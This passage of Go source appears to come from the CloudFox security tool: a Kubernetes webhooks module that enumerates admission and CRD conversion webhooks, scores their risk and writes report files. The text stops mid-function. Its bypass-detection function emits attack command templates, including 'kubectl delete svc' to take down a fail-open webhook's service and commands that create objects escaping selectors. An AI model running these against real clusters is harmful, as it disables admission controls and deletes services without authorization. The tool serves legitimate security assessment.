package commands

import (
	"context"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var WebhooksCmd = &cobra.Command{
	Use:     "webhooks",
	Aliases: []string{"wh"},
	Short:   "Enumerate webhooks with comprehensive security and performance analysis",
	Long: `
Enumerate all cluster webhook configurations with advanced analysis:
  - Mutating, Validating, and CRD conversion webhooks
  - Certificate expiry and validity analysis
  - Service validation and endpoint health
  - Performance impact assessment
  - Webhook chaining detection
  - Bypass opportunity identification
  - Deprecated API version detection
  - Cross-namespace service references
  - Reinvocation policy analysis

  cloudfox kubernetes webhooks`,

	Run: ListWebhooks,
}

type WebhooksOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t WebhooksOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t WebhooksOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type WebhookFinding struct {
	// Basic Info
	Type               string
	Name               string
	WebhookName        string
	Namespace          string
	Service            string
	Path               string
	Age                time.Duration
	AgeDays            int

	// Configuration
	IsExternal         bool
	HasCABundle        bool
	FailurePolicy      string
	TimeoutSeconds     int32
	SideEffects        string
	Operations         []string
	Resources          []string
	Scope              string

	// Advanced Fields
	ReinvocationPolicy      string
	MatchConditions         []string
	AdmissionReviewVersions []string

	// Certificate Analysis
	CertificateExpiry   *time.Time
	CertificateIssuer   string
	CertificateValid    bool
	DaysUntilExpiry     int
	CertificateSubject  string

	// Service Analysis
	ServiceExists      bool
	EndpointCount      int
	WebhookPodsRunning int
	ServiceDangling    bool

	// Performance Analysis
	PerformanceImpact  string
	EstimatedLatencyMs int32

	// Security Analysis
	CrossNamespaceService bool
	ChainedWithWebhooks   []string
	DeprecatedAPIVersion  bool

	// Risk Assessment
	RiskLevel          string
	RiskScore          int
	RiskDescription    string
	SensitiveResources []string
	SecurityIssues     []string
}

type BypassOpportunity struct {
	WebhookName    string
	WebhookType    string
	BypassType     string
	BypassMethod   string
	ExploitCommand string
	RiskLevel      string
}

func ListWebhooks(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating webhooks for %s", globals.ClusterName), globals.K8S_WEBHOOKS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	headers := []string{
		"Type",
		"Name",
		"FailurePolicy",
		"Timeout",
		"CertExpiry",
		"Endpoints",
		"Performance",
		"ChainDepth",
		"Issues",
	}

	var findings []WebhookFinding
	var outputRows [][]string
	loot := shared.NewLootBuilder()

	// Create dynamic client
	restCfg, err := config.GetRESTConfig()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error getting REST config: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}
	dynClient, err := dynamic.NewForConfig(restCfg)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error creating dynamic client: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}

	// Process webhook configurations
	processWebhooks := func(gvr schema.GroupVersionResource, whType string) {
		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			shared.LogListError(&logger, whType, "", err, globals.K8S_WEBHOOKS_MODULE_NAME, false)
			return
		}

		for _, item := range list.Items {
			webhooks, found, _ := unstructured.NestedSlice(item.Object, "webhooks")
			if !found {
				continue
			}

			cfgName, _, _ := unstructured.NestedString(item.Object, "metadata", "name")

			// Age calculation
			creationTimestamp, found, _ := unstructured.NestedString(item.Object, "metadata", "creationTimestamp")
			var age time.Duration
			var ageDays int
			if found {
				t, err := time.Parse(time.RFC3339, creationTimestamp)
				if err == nil {
					age = time.Since(t)
					ageDays = int(age.Hours() / 24)
				}
			}

			for _, whObj := range webhooks {
				whMap := whObj.(map[string]interface{})
				finding := WebhookFinding{
					Type:    whType,
					Name:    cfgName,
					Age:     age,
					AgeDays: ageDays,
				}

				// Extract webhook name
				if whName, ok := whMap["name"].(string); ok {
					finding.WebhookName = whName
				}

				// Extract clientConfig
				ns := "<N/A>"
				svc := ""
				finding.HasCABundle = false
				var caBundle string

				if clientMap, ok := whMap["clientConfig"].(map[string]interface{}); ok {
					if svcMap, ok := clientMap["service"].(map[string]interface{}); ok {
						if n, ok := svcMap["namespace"].(string); ok {
							ns = n
							finding.Namespace = n
						}
						if s, ok := svcMap["name"].(string); ok {
							svc = s
							finding.Service = s
						}
						if p, ok := svcMap["path"].(string); ok && p != "" {
							finding.Path = p
						}
					}
					if u, ok := clientMap["url"].(string); ok && u != "" {
						finding.Path = u
						finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
					}
					if cb, ok := clientMap["caBundle"].(string); ok && cb != "" {
						finding.HasCABundle = true
						caBundle = cb
					}

					// Check for insecure skip verify (if field exists in unstructured)
					if insecure, ok := clientMap["insecureSkipTLSVerify"].(bool); ok && insecure {
						finding.SecurityIssues = append(finding.SecurityIssues, "Insecure TLS verification disabled")
					}
				}

				// Analyze certificate
				if finding.HasCABundle && caBundle != "" {
					expiry, issuer, subject, valid, err := analyzeWebhookCertificate(caBundle)
					if err == nil {
						finding.CertificateExpiry = expiry
						finding.CertificateIssuer = issuer
						finding.CertificateSubject = subject
						finding.CertificateValid = valid

						if expiry != nil {
							daysUntil := int(time.Until(*expiry).Hours() / 24)
							finding.DaysUntilExpiry = daysUntil

							if daysUntil < 0 {
								finding.SecurityIssues = append(finding.SecurityIssues,
									fmt.Sprintf("Certificate expired %d days ago", -daysUntil))
							} else if daysUntil < 30 {
								finding.SecurityIssues = append(finding.SecurityIssues,
									fmt.Sprintf("Certificate expires in %d days", daysUntil))
							}
						}
					}
				}

				// Extract FailurePolicy
				failurePolicy := "Fail"
				if fp, ok := whMap["failurePolicy"].(string); ok {
					failurePolicy = fp
				}
				finding.FailurePolicy = failurePolicy

				// Extract TimeoutSeconds
				timeoutSeconds := int32(10)
				if ts, ok := whMap["timeoutSeconds"].(int64); ok {
					timeoutSeconds = int32(ts)
				} else if ts, ok := whMap["timeoutSeconds"].(float64); ok {
					timeoutSeconds = int32(ts)
				}
				finding.TimeoutSeconds = timeoutSeconds

				// Extract SideEffects
				sideEffects := "Unknown"
				if se, ok := whMap["sideEffects"].(string); ok {
					sideEffects = se
				}
				finding.SideEffects = sideEffects

				// Extract ReinvocationPolicy (Mutating webhooks only)
				if whType == "Mutating" {
					reinvoke := "Never"
					if rp, ok := whMap["reinvocationPolicy"].(string); ok {
						reinvoke = rp
					}
					finding.ReinvocationPolicy = reinvoke

					if reinvoke == "IfNeeded" {
						finding.SecurityIssues = append(finding.SecurityIssues, "Reinvocation enabled (performance impact)")
					}
				}

				// Extract AdmissionReviewVersions
				if arvSlice, ok := whMap["admissionReviewVersions"].([]interface{}); ok {
					for _, v := range arvSlice {
						if vStr, ok := v.(string); ok {
							finding.AdmissionReviewVersions = append(finding.AdmissionReviewVersions, vStr)
						}
					}
				}

				// Check for deprecated API versions
				if len(finding.AdmissionReviewVersions) > 0 {
					hasV1 := false
					hasV1Beta1 := false
					for _, v := range finding.AdmissionReviewVersions {
						if v == "v1" {
							hasV1 = true
						}
						if v == "v1beta1" {
							hasV1Beta1 = true
						}
					}
					if hasV1Beta1 && !hasV1 {
						finding.DeprecatedAPIVersion = true
						finding.SecurityIssues = append(finding.SecurityIssues, "Using deprecated v1beta1 API")
					}
				}

				// Extract MatchConditions (Kubernetes 1.27+)
				if mcSlice, found, _ := unstructured.NestedSlice(whMap, "matchConditions"); found {
					for _, mc := range mcSlice {
						if mcMap, ok := mc.(map[string]interface{}); ok {
							if expr, ok := mcMap["expression"].(string); ok {
								finding.MatchConditions = append(finding.MatchConditions, expr)
							}
						}
					}
				}

				// Extract and analyze rules
				rulesSlice, found, _ := unstructured.NestedSlice(whMap, "rules")
				var allOperations []string
				var allResources []string
				var sensitiveResources []string
				hasWildcardOps := false
				hasWildcardRes := false

				if found && len(rulesSlice) > 0 {
					for _, r := range rulesSlice {
						ruleMap := r.(map[string]interface{})
						ops, _, _ := unstructured.NestedStringSlice(ruleMap, "operations")
						resources, _, _ := unstructured.NestedStringSlice(ruleMap, "resources")

						allOperations = append(allOperations, ops...)
						allResources = append(allResources, resources...)

						if k8sinternal.HasWildcardOperations(ops) {
							hasWildcardOps = true
						}
						if k8sinternal.HasWildcardResources(resources) {
							hasWildcardRes = true
						}

						for _, res := range resources {
							if k8sinternal.IsSensitiveResource(res) && !shared.Contains(sensitiveResources, res) {
								sensitiveResources = append(sensitiveResources, res)
							}
						}
					}
				}

				finding.Operations = k8sinternal.UniqueStrings(allOperations)
				finding.Resources = k8sinternal.UniqueStrings(allResources)
				finding.SensitiveResources = sensitiveResources

				// Extract scope information
				scopeParts := []string{}
				if nsSelector, found, _ := unstructured.NestedMap(whMap, "namespaceSelector"); found {
					if matchLabels, ok := nsSelector["matchLabels"].(map[string]interface{}); ok && len(matchLabels) > 0 {
						scopeParts = append(scopeParts, "namespace-scoped")
					} else {
						scopeParts = append(scopeParts, "all-namespaces")
					}
				} else {
					scopeParts = append(scopeParts, "all-namespaces")
				}

				if objSelector, found, _ := unstructured.NestedMap(whMap, "objectSelector"); found {
					if matchLabels, ok := objSelector["matchLabels"].(map[string]interface{}); ok && len(matchLabels) > 0 {
						scopeParts = append(scopeParts, "label-filtered")
					}
				}
				finding.Scope = strings.Join(scopeParts, ", ")

				// Validate service exists and has endpoints
				if svc != "" && ns != "" && ns != "<N/A>" && !finding.IsExternal {
					exists, endpointCount, err := validateWebhookService(ctx, clientset, ns, svc)
					finding.ServiceExists = exists
					finding.EndpointCount = endpointCount

					if !exists {
						finding.ServiceDangling = true
						finding.SecurityIssues = append(finding.SecurityIssues,
							fmt.Sprintf("Service %s/%s does not exist (dangling webhook)", ns, svc))
					} else if endpointCount == 0 {
						finding.SecurityIssues = append(finding.SecurityIssues,
							fmt.Sprintf("Service %s/%s has no endpoints", ns, svc))
					}

					if err == nil && exists {
						// Get webhook server pods
						finding.WebhookPodsRunning = getWebhookPodCount(ctx, clientset, ns, svc)
					}

					// Check for cross-namespace references
					// Webhooks in kube-system calling services in other namespaces
					if ns != "kube-system" && strings.HasPrefix(cfgName, "kube-") {
						finding.CrossNamespaceService = true
						finding.SecurityIssues = append(finding.SecurityIssues,
							fmt.Sprintf("Cross-namespace service reference: %s", ns))
					}
				}

				// Calculate performance impact
				finding.PerformanceImpact, finding.EstimatedLatencyMs = calculatePerformanceImpact(&finding)

				// Calculate risk level and score
				interceptsSensitive := len(sensitiveResources) > 0
				finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
					finding.IsExternal,
					finding.HasCABundle,
					hasWildcardOps,
					hasWildcardRes,
					interceptsSensitive,
					failurePolicy,
					timeoutSeconds,
				)

				finding.RiskScore = calculateWebhookRiskScore(&finding, hasWildcardOps, hasWildcardRes, interceptsSensitive)

				finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
					finding.IsExternal,
					finding.HasCABundle,
					hasWildcardOps,
					hasWildcardRes,
					interceptsSensitive,
					failurePolicy,
					timeoutSeconds,
					sensitiveResources,
				)

				findings = append(findings, finding)
			}
		}
	}

	// Mutating webhooks
	mutGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "mutatingwebhookconfigurations",
	}
	processWebhooks(mutGVR, "Mutating")

	// Validating webhooks
	validGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}
	processWebhooks(validGVR, "Validating")

	// CRD conversion webhooks
	crdGVR := schema.GroupVersionResource{
		Group:    "apiextensions.k8s.io",
		Version:  "v1",
		Resource: "customresourcedefinitions",
	}

	crdList, err := dynClient.Resource(crdGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "customresourcedefinitions", "", err, globals.K8S_WEBHOOKS_MODULE_NAME, false)
	} else {
		for _, crd := range crdList.Items {
			conversion, found, _ := unstructured.NestedMap(crd.Object, "spec", "conversion")
			if !found {
				continue
			}

			webhookCC, hasWebhook, _ := unstructured.NestedMap(conversion, "webhook", "clientConfig")
			if !hasWebhook {
				continue
			}

			finding := WebhookFinding{
				Type: "CRD Conversion",
				Name: crd.GetName(),
			}

			ns := "<N/A>"
			svc := ""
			finding.HasCABundle = false

			if svcMap, ok := webhookCC["service"].(map[string]interface{}); ok {
				if n, ok := svcMap["namespace"].(string); ok {
					ns = n
					finding.Namespace = n
				}
				if s, ok := svcMap["name"].(string); ok {
					svc = s
					finding.Service = s
				}
				if p, ok := svcMap["path"].(string); ok && p != "" {
					finding.Path = p
				}
			}
			if u, ok := webhookCC["url"].(string); ok && u != "" {
				finding.Path = u
				finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
			}
			if cb, ok := webhookCC["caBundle"].(string); ok && cb != "" {
				finding.HasCABundle = true
			}

			finding.FailurePolicy = "Fail"
			finding.TimeoutSeconds = 10
			finding.Scope = "CRD conversion only"
			finding.Resources = []string{crd.GetName()}

			// Validate service
			if svc != "" && ns != "" && ns != "<N/A>" {
				exists, endpointCount, _ := validateWebhookService(ctx, clientset, ns, svc)
				finding.ServiceExists = exists
				finding.EndpointCount = endpointCount

				if !exists {
					finding.ServiceDangling = true
					finding.SecurityIssues = append(finding.SecurityIssues,
						fmt.Sprintf("Service %s/%s does not exist", ns, svc))
				}
			}

			finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
				finding.IsExternal,
				finding.HasCABundle,
				false, false, false,
				"Fail", 10,
			)

			finding.RiskScore = calculateWebhookRiskScore(&finding, false, false, false)

			finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
				finding.IsExternal,
				finding.HasCABundle,
				false, false, false,
				"Fail", 10, []string{},
			)

			finding.PerformanceImpact, finding.EstimatedLatencyMs = calculatePerformanceImpact(&finding)

			findings = append(findings, finding)
		}
	}

	// Detect webhook chains
	chains := detectWebhookChains(findings)
	for i := range findings {
		chainKey := fmt.Sprintf("%s:%v", findings[i].Type, findings[i].Resources)
		if chainWebhooks, exists := chains[chainKey]; exists && len(chainWebhooks) > 1 {
			findings[i].ChainedWithWebhooks = chainWebhooks
		}
	}

	// Detect bypass opportunities
	bypassOpportunities := detectBypassOpportunities(findings)

	// Build loot files using LootBuilder
	buildWebhookLootFiles(loot, findings, bypassOpportunities, chains, globals.KubeContext)

	// Build output rows
	for _, finding := range findings {
		certExpiryStr := "N/A"
		if finding.DaysUntilExpiry != 0 {
			if finding.DaysUntilExpiry < 0 {
				certExpiryStr = fmt.Sprintf("EXPIRED %dd", -finding.DaysUntilExpiry)
			} else {
				certExpiryStr = fmt.Sprintf("%dd", finding.DaysUntilExpiry)
			}
		}

		endpointsStr := "N/A"
		if finding.ServiceExists {
			endpointsStr = fmt.Sprintf("%d", finding.EndpointCount)
		} else if finding.ServiceDangling {
			endpointsStr = "NONE"
		}

		chainDepth := len(finding.ChainedWithWebhooks)
		chainDepthStr := "0"
		if chainDepth > 0 {
			chainDepthStr = fmt.Sprintf("%d", chainDepth)
		}

		outputRows = append(outputRows, []string{
			finding.Type,
			finding.Name,
			finding.FailurePolicy,
			fmt.Sprintf("%ds", finding.TimeoutSeconds),
			certExpiryStr,
			endpointsStr,
			finding.PerformanceImpact,
			chainDepthStr,
			fmt.Sprintf("%d", len(finding.SecurityIssues)),
		})
	}

	// Sort findings by risk score descending
	sort.Slice(findings, func(i, j int) bool {
		return findings[i].RiskScore > findings[j].RiskScore
	})

	// Build final loot files
	lootFiles := loot.Build()

	table := internal.TableFile{
		Name:   "Webhooks",
		Header: headers,
		Body:   outputRows,
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Webhooks",
		globals.ClusterName,
		"results",
		WebhooksOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		riskCounts := shared.NewRiskCounts()
		for _, f := range findings {
			riskCounts.Add(f.RiskLevel)
		}

		if riskCounts.Critical > 0 || riskCounts.High > 0 {
			logger.InfoM(fmt.Sprintf("%d webhooks found (%d CRITICAL, %d HIGH risk)",
				len(outputRows), riskCounts.Critical, riskCounts.High), globals.K8S_WEBHOOKS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("%d webhooks found", len(outputRows)), globals.K8S_WEBHOOKS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No webhooks found, skipping output file creation", globals.K8S_WEBHOOKS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_WEBHOOKS_MODULE_NAME), globals.K8S_WEBHOOKS_MODULE_NAME)
}

// ====================
// Helper Functions
// ====================

func analyzeWebhookCertificate(caBundle string) (expiry *time.Time, issuer, subject string, valid bool, err error) {
	if caBundle == "" {
		return nil, "", "", false, fmt.Errorf("no CA bundle")
	}

	decoded, err := base64.StdEncoding.DecodeString(caBundle)
	if err != nil {
		return nil, "", "", false, err
	}

	block, _ := pem.Decode(decoded)
	if block == nil {
		return nil, "", "", false, fmt.Errorf("failed to parse PEM")
	}

	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil, "", "", false, err
	}

	now := time.Now()
	valid = now.After(cert.NotBefore) && now.Before(cert.NotAfter)

	return &cert.NotAfter, cert.Issuer.String(), cert.Subject.String(), valid, nil
}

func validateWebhookService(ctx context.Context, clientset *kubernetes.Clientset, namespace, serviceName string) (exists bool, endpointCount int, err error) {
	// Check service exists
	_, err = clientset.CoreV1().Services(namespace).Get(ctx, serviceName, metav1.GetOptions{})
	if err != nil {
		return false, 0, err
	}
	exists = true

	// Check endpoints
	endpoints, err := clientset.CoreV1().Endpoints(namespace).Get(ctx, serviceName, metav1.GetOptions{})
	if err != nil {
		return exists, 0, err
	}

	for _, subset := range endpoints.Subsets {
		endpointCount += len(subset.Addresses)
	}

	return exists, endpointCount, nil
}

func getWebhookPodCount(ctx context.Context, clientset *kubernetes.Clientset, namespace, serviceName string) int {
	// Get service to find selector
	svc, err := clientset.CoreV1().Services(namespace).Get(ctx, serviceName, metav1.GetOptions{})
	if err != nil {
		return 0
	}

	// List pods with service selector
	labelSelector := metav1.FormatLabelSelector(&metav1.LabelSelector{MatchLabels: svc.Spec.Selector})
	pods, err := clientset.CoreV1().Pods(namespace).List(ctx, metav1.ListOptions{
		LabelSelector: labelSelector,
	})
	if err != nil {
		return 0
	}

	runningCount := 0
	for _, pod := range pods.Items {
		if pod.Status.Phase == corev1.PodRunning {
			runningCount++
		}
	}

	return runningCount
}

func calculatePerformanceImpact(finding *WebhookFinding) (impact string, estimatedLatency int32) {
	score := 0

	// Timeout contributes to latency
	if finding.TimeoutSeconds > 20 {
		score += 40
	} else if finding.TimeoutSeconds > 10 {
		score += 20
	}

	// Fail policy means API waits
	if finding.FailurePolicy == "Fail" {
		score += 20
	}

	// Wildcard operations = called frequently
	hasWildcard := false
	for _, op := range finding.Operations {
		if op == "*" {
			hasWildcard = true
			break
		}
	}
	if hasWildcard {
		score += 30
	}

	// Many resources = called frequently
	if len(finding.Resources) > 10 {
		score += 20
	}

	// External URL adds network latency
	if finding.IsExternal {
		score += 15
	}

	// Reinvocation doubles the calls
	if finding.ReinvocationPolicy == "IfNeeded" {
		score += 25
	}

	// No endpoints = timeout always
	if finding.ServiceDangling || finding.EndpointCount == 0 {
		score += 50
	}

	estimatedLatency = finding.TimeoutSeconds * 1000

	if score >= 75 {
		return shared.RiskCritical, estimatedLatency
	} else if score >= 50 {
		return shared.RiskHigh, estimatedLatency
	} else if score >= 25 {
		return shared.RiskMedium, estimatedLatency
	}
	return shared.RiskLow, estimatedLatency
}

func calculateWebhookRiskScore(finding *WebhookFinding, hasWildcardOps, hasWildcardRes, interceptsSensitive bool) int {
	score := 0

	// External webhooks
	if finding.IsExternal {
		score += 40
		if !finding.HasCABundle {
			score += 20
		}
	}

	// Wildcard operations/resources
	if hasWildcardOps {
		score += 25
	}
	if hasWildcardRes {
		score += 30
	}

	// Sensitive resources
	if interceptsSensitive {
		score += 30
	}

	// Fail policy with high timeout
	if finding.FailurePolicy == "Fail" && finding.TimeoutSeconds > 15 {
		score += 20
	}

	// Certificate issues
	if finding.DaysUntilExpiry < 0 {
		score += 35 // Expired
	} else if finding.DaysUntilExpiry > 0 && finding.DaysUntilExpiry < 30 {
		score += 15 // Expiring soon
	}

	// Service issues
	if finding.ServiceDangling {
		score += 40 // No service = potential DOS
	} else if finding.EndpointCount == 0 {
		score += 35 // No endpoints = potential DOS
	}

	// Cross-namespace
	if finding.CrossNamespaceService {
		score += 15
	}

	// Deprecated API
	if finding.DeprecatedAPIVersion {
		score += 10
	}

	// Performance impact
	if finding.PerformanceImpact == shared.RiskCritical {
		score += 20
	} else if finding.PerformanceImpact == shared.RiskHigh {
		score += 10
	}

	// Webhook chains
	if len(finding.ChainedWithWebhooks) > 2 {
		score += 15
	} else if len(finding.ChainedWithWebhooks) > 0 {
		score += 5
	}

	// Reinvocation
	if finding.ReinvocationPolicy == "IfNeeded" {
		score += 10
	}

	return webhooksMin(score, 100)
}

func detectWebhookChains(findings []WebhookFinding) map[string][]string {
	// resourceKey -> list of webhook names
	chains := make(map[string][]string)

	for _, f := range findings {
		for _, resource := range f.Resources {
			for _, op := range f.Operations {
				key := fmt.Sprintf("%s:%s:%s", f.Type, resource, op)
				chains[key] = append(chains[key], f.Name)
			}
		}
	}

	// Return only chains with multiple webhooks
	result := make(map[string][]string)
	for key, webhooks := range chains {
		if len(webhooks) > 1 {
			result[key] = webhooks
		}
	}

	return result
}

func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
	opportunities := []BypassOpportunity{}

	for _, f := range findings {
		// Namespace selector bypass
		if strings.Contains(f.Scope, "namespace-scoped") {
			opportunities = append(opportunities, BypassOpportunity{
				WebhookName:    f.Name,
				WebhookType:    f.Type,
				BypassType:     "namespace-selector",
				BypassMethod:   "Create namespace with non-matching labels",
				ExploitCommand: fmt.Sprintf("kubectl create ns bypass-%s", strings.ToLower(f.Name[:10])),
				RiskLevel:      shared.RiskHigh,
			})
		}

		// Object selector bypass
		if strings.Contains(f.Scope, "label-filtered") {
			opportunities = append(opportunities, BypassOpportunity{
				WebhookName:    f.Name,
				WebhookType:    f.Type,
				BypassType:     "object-selector",
				BypassMethod:   "Create objects with non-matching labels",
				ExploitCommand: "kubectl run bypass-pod --image=alpine --labels=bypass=true",
				RiskLevel:      shared.RiskHigh,
			})
		}

		// Failure policy bypass
		if f.FailurePolicy == "Ignore" {
			opportunities = append(opportunities, BypassOpportunity{
				WebhookName:    f.Name,
				WebhookType:    f.Type,
				BypassType:     "failure-policy",
				BypassMethod:   "Make webhook unavailable, requests will be allowed",
				ExploitCommand: fmt.Sprintf("kubectl delete svc %s -n %s", f.Service, f.Namespace),
				RiskLevel:      shared.RiskCritical,
			})
		}

		// Dangling webhook bypass
		if f.ServiceDangling {
			opportunities = append(opportunities, BypassOpportunity{
				WebhookName:    f.Name,
				WebhookType:    f.Type,
				BypassType:     "dangling-service",
				BypassMethod:   "Webhook has no backend service - requests timeout or fail open",
				ExploitCommand: "# Deploy resources - webhook will fail",
				RiskLevel:      shared.RiskCritical,
			})
		}
	}

	return opportunities
}

func buildWebhookLootFiles(loot *shared.LootBuilder, findings []WebhookFinding, bypasses []BypassOpportunity, chains map[string][]string, kubeContext string) {
	// 1. Security Analysis
	buildSecurityAnalysisLoot(loot, findings, kubeContext)

	// 2. Certificate Analysis
	buildCertificateLoot(loot, findings, kubeContext)

	// 3. Performance Analysis
	buildPerformanceLoot(loot, findings, kubeContext)

	// 4. Webhook Chains
	buildChainsLoot(loot, chains, findings, kubeContext)

	// 5. Bypass Opportunities
	buildBypassLoot(loot, bypasses, kubeContext)

	// 6. Service Validation
	buildServiceValidationLoot(loot, findings, kubeContext)

	// 7. Exploitation Techniques
	buildExploitationLoot(loot, findings, kubeContext)
}

func buildSecurityAnalysisLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Security-Analysis")
	section.SetHeader(`#####################################
##### Webhook Security Analysis
#####################################
#
# Prioritized security findings by risk level
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	// Group by risk
	critical := []WebhookFinding{}
	high := []WebhookFinding{}
	medium := []WebhookFinding{}

	for _, f := range findings {
		switch f.RiskLevel {
		case shared.RiskCritical:
			critical = append(critical, f)
		case shared.RiskHigh:
			high = append(high, f)
		case shared.RiskMedium:
			medium = append(medium, f)
		}
	}

	if len(critical) > 0 {
		section.AddBlank()
		section.Addf("## CRITICAL RISK WEBHOOKS (%d found)", len(critical))
		section.AddBlank()
		for _, f := range critical {
			section.AddBlank()
			section.Addf("### [CRITICAL - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name)
			section.Addf("# Risk: %s", f.RiskDescription)
			if len(f.SecurityIssues) > 0 {
				section.Addf("# Security Issues: %d", len(f.SecurityIssues))
				for _, issue := range f.SecurityIssues {
					section.Addf("#   - %s", issue)
				}
			}
			if len(f.SensitiveResources) > 0 {
				section.Addf("# SENSITIVE RESOURCES: %v", f.SensitiveResources)
			}
		}
	}

	if len(high) > 0 {
		section.AddBlank()
		section.Addf("## HIGH RISK WEBHOOKS (%d found)", len(high))
		section.AddBlank()
		for _, f := range high {
			section.AddBlank()
			section.Addf("### [HIGH - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name)
			if len(f.SecurityIssues) > 0 {
				for _, issue := range f.SecurityIssues {
					section.Addf("# - %s", issue)
				}
			}
		}
	}
}

func buildCertificateLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Certificates")
	section.SetHeader(`#####################################
##### Webhook Certificate Analysis
#####################################
#
# Certificate expiry and validity analysis
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	expired := []WebhookFinding{}
	expiringSoon := []WebhookFinding{}
	valid := []WebhookFinding{}

	for _, f := range findings {
		if f.HasCABundle {
			if f.DaysUntilExpiry < 0 {
				expired = append(expired, f)
			} else if f.DaysUntilExpiry < 30 {
				expiringSoon = append(expiringSoon, f)
			} else {
				valid = append(valid, f)
			}
		}
	}

	if len(expired) > 0 {
		section.AddBlank()
		section.Addf("## EXPIRED CERTIFICATES (%d found)", len(expired))
		section.AddBlank()
		for _, f := range expired {
			section.AddBlank()
			section.Addf("### %s: %s", f.Type, f.Name)
			section.Addf("# EXPIRED %d days ago", -f.DaysUntilExpiry)
			section.Addf("# Subject: %s", f.CertificateSubject)
		}
	}

	if len(expiringSoon) > 0 {
		section.AddBlank()
		section.Addf("## EXPIRING SOON (%d found)", len(expiringSoon))
		section.AddBlank()
		for _, f := range expiringSoon {
			section.AddBlank()
			section.Addf("### %s: %s - Expires in %d days", f.Type, f.Name, f.DaysUntilExpiry)
		}
	}
}

func buildPerformanceLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Performance")
	section.SetHeader(`#####################################
##### Webhook Performance Analysis
#####################################
#
# Performance impact assessment
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	critical := []WebhookFinding{}
	high := []WebhookFinding{}

	for _, f := range findings {
		if f.PerformanceImpact == shared.RiskCritical {
			critical = append(critical, f)
		} else if f.PerformanceImpact == shared.RiskHigh {
			high = append(high, f)
		}
	}

	if len(critical) > 0 {
		section.AddBlank()
		section.Addf("## CRITICAL PERFORMANCE IMPACT (%d webhooks)", len(critical))
		section.AddBlank()
		for _, f := range critical {
			section.AddBlank()
			section.Addf("### %s: %s", f.Type, f.Name)
			section.Addf("# Timeout: %ds | Latency: %dms", f.TimeoutSeconds, f.EstimatedLatencyMs)
			section.Addf("# Failure Policy: %s", f.FailurePolicy)
			if len(f.Operations) > 0 {
				section.Addf("# Operations: %v", f.Operations)
			}
		}
	}
}

func buildChainsLoot(loot *shared.LootBuilder, chains map[string][]string, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Chains")
	section.SetHeader(`#####################################
##### Webhook Chains Detection
#####################################
#
# Multiple webhooks on same resources
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	if len(chains) == 0 {
		section.AddBlank()
		section.Add("# No webhook chains detected")
		section.AddBlank()
		return
	}

	section.AddBlank()
	section.Addf("## WEBHOOK CHAINS DETECTED (%d chains)", len(chains))
	section.AddBlank()

	for key, webhooks := range chains {
		section.AddBlank()
		section.Addf("### Chain: %s", key)
